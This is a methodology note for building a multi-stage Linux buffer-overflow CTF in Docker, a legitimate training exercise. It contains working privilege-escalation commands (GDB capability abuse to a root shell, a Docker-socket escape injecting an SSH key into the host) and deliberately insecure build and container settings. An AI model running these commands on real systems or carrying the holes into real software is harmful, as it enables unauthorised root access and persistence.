---
title: "CTF Creation — Linux BOF Infrastructure"
type: technique
tags: [bof, exploit-dev, methodology, privilege-escalation]
phase: methodology
date_created: 2026-05-23
date_updated: 2026-05-23
sources: []
---

# CTF Creation — Linux BOF Infrastructure

Design and deployment patterns for a multi-stage Linux BOF CTF hosted in Docker on a bare Ubuntu host. Covers flag chain design, anti-cheat, multi-player hygiene, and testing methodology.

---

## Flag Chain Design

Progressive difficulty — each flag requires the previous shell/access level.

| Stage | Access gained | Challenge type |
|---|---|---|
| 1 | Restricted shell as low-priv user | Stack BOF → shellcode |
| 2 | Container root | Capability abuse (GDB `cap_setuid`) |
| 3 | Host low-priv user | Docker socket escape + SSH key injection |
| 4 | Host root | Kernel LPE (DirtyFrag / DirtyPipe class) |

**Rule:** Each flag file must only be readable at the access level it represents. `bof.txt` and `docker.txt` live inside the container; `user.txt` (644, ubuntu) and `root.txt` (600, root) live on the host.

---

## Infrastructure

### Container setup

```dockerfile
FROM ubuntu:20.04
RUN apt-get install -y socat iptables gdb libcap2-bin docker.io
RUN setcap cap_setuid,cap_setgid+ep /usr/bin/gdb
RUN useradd -m ctf && usermod -aG dockersock ctf
COPY adminpanel /opt/adminpanel
COPY start.sh /start.sh
```

### Firewall bypass challenge

Restrict port access to source port 53 only — forces players to use `-g 53` with nmap and bind sport in exploit:

```bash
# start.sh inside container
iptables -A INPUT -p tcp --dport 8443 --sport 53 -j ACCEPT
iptables -A INPUT -p tcp --dport 8443 -j DROP
socat TCP-LISTEN:8443,reuseaddr,fork,bind=0.0.0.0 EXEC:/opt/adminpanel
```

Exploit must: `s.bind(('0.0.0.0', 53)); s.connect((TARGET, PORT))` — requires root on attacker.

### Docker socket escape path

Mount `/var/run/docker.sock` into container and add low-priv user to `dockersock` group. Player must enumerate capabilities → escalate to root → discover socket → escape.

```yaml
# docker-compose.yml
volumes:
  - /var/run/docker.sock:/var/run/docker.sock
cap_add:
  - NET_ADMIN
  - LINUX_IMMUTABLE
```

`LINUX_IMMUTABLE` cap required for `chattr +i` on flag files inside container.

---

## Binary Design

Target binary for flag 1: ELF 64-bit, stripped, no canary, NX disabled, no PIE.

```bash
gcc -m64 -fno-stack-protector -z execstack -no-pie -O0 -o adminpanel src.c && strip --strip-all adminpanel
```

Add decoy strings to slow down analysis:

```c
const char *decoys[] = {
    "auth_token_validator_v2",
    "security_module_initialized",
    "validate_session_integrity",
    "admin_bypass_protection_enabled",
};
```

Single code path: print banner → `read()` → print "Access denied". The `read()` is the overflow.

---

## Privilege Escalation as Challenges

### GDB capability abuse (container → root)

```bash
setcap cap_setuid,cap_setgid+ep /usr/bin/gdb
```

Player discovers via `getcap -r / 2>/dev/null`, escalates via Python bridge:

```bash
gdb -nx -ex 'python import os; os.setuid(0); os.setgid(0)' -ex 'shell /bin/bash -p' -ex quit
```

Why GDB: teaches capability enumeration, uses a recognizable tool with a non-obvious exploit path, realistic misconfiguration (dev tools with excess caps).

### SSH key injection + kernel LPE (host ubuntu → root)

After docker socket escape (container root):

1. Use docker volume mount to write attacker pubkey into `/host/home/ubuntu/.ssh/authorized_keys`
2. SSH in as ubuntu (password auth disabled — injection is the only path)
3. Download and compile kernel LPE (gcc pre-installed, no binary provided)
4. Get root shell, read `root.txt` (chmod 600)

Base64 injection technique (avoids space-in-pubkey issues through shell pipelines):

```bash
B64=$(base64 -w0 ~/.ssh/id_ed25519.pub)
docker -H unix:///var/run/docker.sock run --rm -v /:/host alpine sh -c \
  "mkdir -p /host/home/ubuntu/.ssh && echo ${B64} | base64 -d >> /host/home/ubuntu/.ssh/authorized_keys && chmod 700 /host/home/ubuntu/.ssh && chmod 600 /host/home/ubuntu/.ssh/authorized_keys && chown -R 1000:1000 /host/home/ubuntu/.ssh"
```

---

## SSH Configuration

```bash
# configure_ssh() — run during deploy
sed -i 's/^#*\s*PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
sed -i 's/^#*\s*PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config
install -d -m 700 -o ubuntu -g ubuntu /home/ubuntu/.ssh
: > /home/ubuntu/.ssh/authorized_keys
chmod 600 /home/ubuntu/.ssh/authorized_keys
chown ubuntu:ubuntu /home/ubuntu/.ssh/authorized_keys
ufw allow 22/tcp >/dev/null 2>&1 || true
systemctl restart ssh
```

Forcing pubkey-only means SSH key injection via docker socket is the **required** path — password brute force is impossible.

---

## Anti-Cheat

### Immutable flag files

```bash
chattr +i /home/ctf/bof.txt /root/docker.txt     # inside container (needs LINUX_IMMUTABLE cap)
chattr +i /home/ubuntu/user.txt /root/root.txt    # host
```

Players cannot delete flags to deny others. On redeploy, `chattr -i` before overwriting.

### Hidden flag watchdog

Root-only script + personal crontab (not `/etc/cron.d/` — world-readable):

```bash
cat > /root/.flag-watchdog << 'EOF'
#!/bin/bash
restore_flag() {
  local path="$1" content="$2" owner="$3" perms="$4"
  [[ -f "${path}" ]] && return
  chattr -i "${path}" 2>/dev/null || true
  printf '%s\n' "${content}" > "${path}"
  chown "${owner}:${owner}" "${path}"; chmod "${perms}" "${path}"
  chattr +i "${path}"
}
restore_flag /home/ubuntu/user.txt 'FLAG{...}' ubuntu 644
restore_flag /root/root.txt        'FLAG{...}' root   600
EOF
chmod 700 /root/.flag-watchdog
( crontab -l 2>/dev/null || true ) | grep -v '\.flag-watchdog' > /tmp/.ctab || true
echo "* * * * * /root/.flag-watchdog >/dev/null 2>&1" >> /tmp/.ctab
crontab /tmp/.ctab && rm -f /tmp/.ctab
```

`crontab -l` as non-root returns nothing. Script in `/root/` with leading dot — invisible to `ls` without `-a`.

### Null `.bash_history`

```bash
ln -sf /dev/null /home/ctf/.bash_history
ln -sf /dev/null /home/ubuntu/.bash_history
ln -sf /dev/null /root/.bash_history
```

Prevents players from reading prior attempts or exploit commands from other teams.

---

## Multi-Player Support

### Page cache clearing (for dirty page class exploits)

If the CTF uses a DirtyPipe/DirtyFrag-class kernel LPE, multiple simultaneous players leave dirty pages that interfere with each other. Clear every 30s:

```bash
# systemd service loop
ExecStart=/bin/bash -c 'while true; do echo 3 > /proc/sys/vm/drop_caches; sleep 30; done'
```

`echo 3 > /proc/sys/vm/drop_caches` evicts only **clean** pages — safe on running systems, does not break Docker or active processes.

---

## Deploy Script Patterns

Single bash script, idempotent, supports `--redeploy` and `--clean`:

```bash
set -euo pipefail

REDEPLOY=false; CLEAN=false; DIRTYFRAG=false
while [[ $# -gt 0 ]]; do
  case $1 in
    --redeploy) REDEPLOY=true ;;
    --clean)    CLEAN=true ;;
    --dirtyfrag) DIRTYFRAG=true ;;
  esac; shift
done

# Execution order
write_runtime_files     # heredoc: src.c, Dockerfile, docker-compose.yml, start.sh
install_host_deps       # apt: gcc, gdb, docker.io, openssh-server, build-essential
write_env               # predefined flags → runtime/.env
setup_host_flags        # write flag files, chattr +i
configure_ssh           # PasswordAuthentication no, pre-create .ssh/
install_flag_watchdog   # hidden root crontab
install_dirtyfrag       # no-op if not --dirtyfrag (gcc pre-installed)
install_cache_cleaner   # systemd service, gated on --dirtyfrag
deploy_stack            # docker compose up --build
```

**Pipefail gotcha:** `crontab -l | grep ...` fails when no crontab exists (exit 1). Fix:

```bash
( crontab -l 2>/dev/null || true ) | grep -v pattern > /tmp/.ctab || true
```

**Redeploy gotcha:** `chattr +i` blocks overwrite on redeploy. Always `chattr -i` before writing flag files.

---

## Predefined vs Random Flags

Predefined flags are required when:
- solve.md / writeups reference exact values
- Flags stored in external scoreboard that can't be regenerated
- Multi-day event where players pick up mid-challenge

```bash
BOF_FLAG="${BOF_FLAG:-A1b2C3d4E5f6G7h8I9jK}"   # override with env var
```

---

## Testing Methodology

**Never test exploit from the target machine itself.** Use a separate attacker VM on the same LAN.

- Source port 53 bind fails from WSL2 (Windows NAT remaps ports)
- Local testing misses firewall rules, socket inheritance, socat behavior
- Tests must mirror participant experience end-to-end

```
Attacker VM (Kali 192.168.23.128) → Target (Ubuntu 192.168.23.129:8443)
```

Test checklist:
- [ ] nmap `-g 53` shows port open
- [ ] exploit.py runs as root (sport 53 bind)
- [ ] Flag 1: ctf shell via shellcode
- [ ] Flag 2: GDB cap abuse → container root
- [ ] Flag 3: docker socket escape → ubuntu SSH access
- [ ] Flag 4: dirtyfrag LPE → root → root.txt readable

---

## Related

- [[binary-exploitation]] — BOF mechanics, shellcode, ROP
- [[gdb-gef]] — GDB+GEF setup and offset/bad-char workflow
